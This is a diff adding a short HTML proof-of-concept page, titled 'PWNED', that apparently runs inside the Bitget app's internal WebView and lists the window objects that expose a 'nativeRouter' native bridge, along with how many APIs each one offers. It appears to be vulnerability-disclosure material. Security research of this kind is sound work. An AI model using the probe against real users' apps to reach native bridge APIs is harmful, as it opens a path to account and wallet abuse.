@@ -1,0 +1,13 @@
+<!DOCTYPE html><html><head><title>PWNED — inside Bitget internal WebView</title></head>
+<body style="background:#fdd">
+<h2>⚠ Arbitrary page inside Bitget internal WebView</h2>
+<pre id="out">checking bridge...</pre>
+<script>
+function log(s){document.getElementById('out').textContent += "\n"+s;}
+setTimeout(function(){
+  var ks = [];
+  for (var k in window) if (typeof window[k]=="object" && window[k] && "nativeRouter" in window[k]) ks.push(k+" -> "+Object.keys(window[k]).length+" APIs");
+  log(ks.length ? "BRIDGE OBJECTS: "+ks.join(", ") : "no bridge object visible");
+}, 1000);
+</script>
+</body></html>
